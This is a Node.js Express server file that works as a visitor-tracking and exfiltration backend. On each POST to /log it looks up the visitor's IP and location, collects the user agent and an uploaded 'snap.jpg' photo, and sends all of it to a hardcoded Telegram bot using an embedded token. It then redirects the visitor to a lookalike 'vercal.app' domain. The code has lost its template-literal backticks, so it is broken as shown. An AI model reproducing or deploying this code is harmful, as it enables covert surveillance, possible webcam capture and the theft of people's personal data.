// server.js
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');

const app = express();
const upload = multer();

const BOT = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
const CHAT = "7216371031";
const REDIRECT = "https://opaslabs.vercal.app/";
const IP_TOKEN = "18d2a866939a58";

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

app.post('/log', upload.single('photo'), async (req, res) => {
  const ipInfo = await fetch(https://ipinfo.io/json?token=${IP_TOKEN})
    .then(r => r.json()).catch(()=>({ ip: 'ERR' }));

  const text = 
🔐 Visitor Info:
🌐 IP: ${ipInfo.ip}
📍 ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
🕓 ${new Date().toLocaleString()}
🧠 UA: ${req.body.ua}
;

  await fetch(https://api.telegram.org/bot${BOT}/sendMessage, {
    method: "POST",
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT, text })
  });

  if (req.file) {
    const form = new fetch.FormData();
    form.append('chat_id', CHAT);
    form.append('photo', req.file.buffer, { filename: 'snap.jpg' });

    await fetch(https://api.telegram.org/bot${BOT}/sendPhoto, {
      method: "POST",
      body: form
    });
  }

  res.redirect(REDIRECT);
});

app.listen(3000, ()=>console.log('Server up on http://localhost:3000'));
